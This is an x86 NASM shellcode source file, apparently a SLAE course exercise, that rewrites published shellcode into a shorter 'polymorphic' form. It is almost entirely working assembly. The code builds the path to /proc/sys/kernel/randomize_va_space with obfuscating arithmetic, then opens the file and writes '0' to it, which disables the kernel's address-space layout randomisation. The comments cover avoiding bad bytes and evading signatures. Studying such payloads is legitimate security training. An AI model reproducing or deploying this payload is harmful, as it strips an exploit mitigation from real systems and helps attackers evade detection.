; File: disable-randomize-va-space.nasm
; Author: Gitsnik SLAE-431
; Website: http://dracyrys.com/
;
; This is a rewrite of the shellstorm code
; (106 bytes) written by Jonathan Salwan
; 37 lines.
;
; Considering who this shellcode is by I
; am a bit surprised at how it is laid out.
;
; As always, first I have converted this to
; Intel, rewritten it to be shorter shellcode
; ( 81 bytes 9/37 lines [76.41% and 24.32%])
; before polymorphing the left overs.
;
; After polymorphing:
; 101 bytes 5/37 lines
;
; Notes:
;
;	There are three lines that contain 0d
;	or 0a characters which can cause bad
;	things in certain string reading
;	shellcodes
;
;	Luckily they are in the sub/add instruction
;	block so if it is a problem careful maths
;	should get you out of it.
;
;  /proc/sys/kernel//randomize_va_space
;

global _start

section .text

_start:

	xor ecx, ecx
	mul ecx

	; This time rather than using xor
	; we are going to hard code math
	; functions for the entire string
	; stored in EAX, then blank it at
	; the end for use elsewhere.

	push eax		; null
	add eax, 0x65636170	; ecap
	push eax

	add eax, 0x0dfbfdd4
	add ax, 0x0232		; Steps us to 0x735f6176 (s_av)
	push eax		; necessary because of nulls

	sub eax, 0x13f9e70d	; 0x5f657a69 (_ezi)
	push eax

	add eax, 0x0e09ea05	; 0x6d6f646e (modn)
	push eax

	sub eax, 0x0bfd353f	; 0x61722f2f (ar//)
	push eax

	add eax, 0x0af33f43	; 0x6c656e72 (lenr)
	push eax

	sub eax, 0x06fa3eff	; 0x656b2f73 (ek/s)
	push eax

	add eax, 0x1407fff0	; 0x79732f63 (ys/c)
	push eax

	sub eax, 0x08ffae23
	sub eax, 0x01011111
	push eax		; 0x6f72702f (orp/)

	xor eax, eax
	mov ebx, esp	; ebx has string [same]

	add cx, 0x441	; flags O_WRONLY|O_CREAT|O_APPEND
	add dx, 0x1a4	; 0644
	add al, 0x05	; open()
	int 0x80	; [same]

	xchg ebx, eax	; cheaper than mov ebx, eax

	push 0x30	; 0 ascii
	mov ecx, esp

	xor eax, eax	; [same]

	cdq		; cheaper to put this down here
	inc edx		; after we clear EAX, saves us
			; a byte 

	add al, 0x4	; write()
	int 0x80	; [same]

			; write returns number of bytes
			; written, and we're only writing
			; 1
	int 0x80	; [same]
